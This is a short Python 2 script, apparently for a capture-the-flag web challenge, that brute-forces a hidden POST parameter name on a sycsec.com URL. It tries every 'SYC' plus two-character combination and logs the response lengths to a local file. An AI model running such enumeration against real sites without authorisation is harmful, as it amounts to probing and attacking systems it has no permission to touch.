'''
@author: wenhuizone
'''

import urllib2  
import urllib  
import cookielib  
import string 


TARGET_URL = "http://web1.sycsec.com/b33804a7301e583ca6a473c1c092b09f/"
dic='d:/bp.txt'
out=[]
output=''
for i in range(65,127):
    for j in range(65,127):
        output='SYC'+chr(i)+chr(j)+'\n'
        out.append(output)

for k in range(0,len(out)):
    filename=open(dic,'a')
    req = urllib2.Request(TARGET_URL)  
    cj = cookielib.CookieJar()   
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))   
    res = opener.open(req)  
    value = {out[k]: 1}  
    data = urllib.urlencode(value)  
    request = urllib2.Request(TARGET_URL,data)  
    response = opener.open(request)
    html=response.read()
    length=len(html)
    s="item: %s length: %d "%(out[k],length)
    filename.write(s)
filename.close()
    #"item:"+out[k]+"length:"+length